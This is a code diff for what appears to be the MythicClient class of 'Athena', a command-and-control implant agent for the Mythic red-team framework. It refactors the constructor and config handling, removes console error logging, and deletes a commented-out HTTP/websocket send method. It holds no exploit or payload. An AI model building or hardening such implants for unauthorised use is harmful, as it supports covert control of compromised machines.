@@ -2,12 +2,10 @@
 using Athena.Config;
 using System;
 using System.Collections.Generic;
-using System.Threading.Tasks;
 using Athena.Mythic.Model.Checkin;
 using System.Net;
 using System.Diagnostics;
 using Athena.Utilities;
-using System.Net.Http;
 using Newtonsoft.Json;
 using Athena.Mythic.Model;
 using Athena.Mythic.Model.Response;
@@ -18,11 +16,10 @@ namespace Athena
     public class MythicClient
     {
         public MythicConfig MythicConfig { get; set; }
-        public MythicClient(MythicConfig conf)
+        public MythicClient()
         {
-            this.MythicConfig = conf;
+            this.MythicConfig = new MythicConfig();
         }
-
         public CheckinResponse CheckIn()
         {
             Checkin ct = new Checkin()
@@ -39,8 +36,7 @@ namespace Athena
             };
             var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
             try
-            {
-                
+            {              
                 CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                 if(cs == null)
                 {
@@ -153,29 +149,11 @@ namespace Athena
                     return false;
                 }
             }
-            catch (Exception e)
+            catch
             {
-                Console.WriteLine(e.Message);
                 return false;
             }
-
             return true;
         }
-
-        //public async Task<string> Send(object message)
-        //{
-        //    bool http = false;
-        //    bool websocket = true;
-
-        //    if (http)
-        //    {
-        //        return await this.MythicConfig.currentConfig.Send(message);
-        //    }
-        //    else if (websocket)
-        //    {
-        //        return await this.MythicConfig.websocketConfig.Send(message);
-        //    }
-        //    else return "";
-        //}
     }
 }
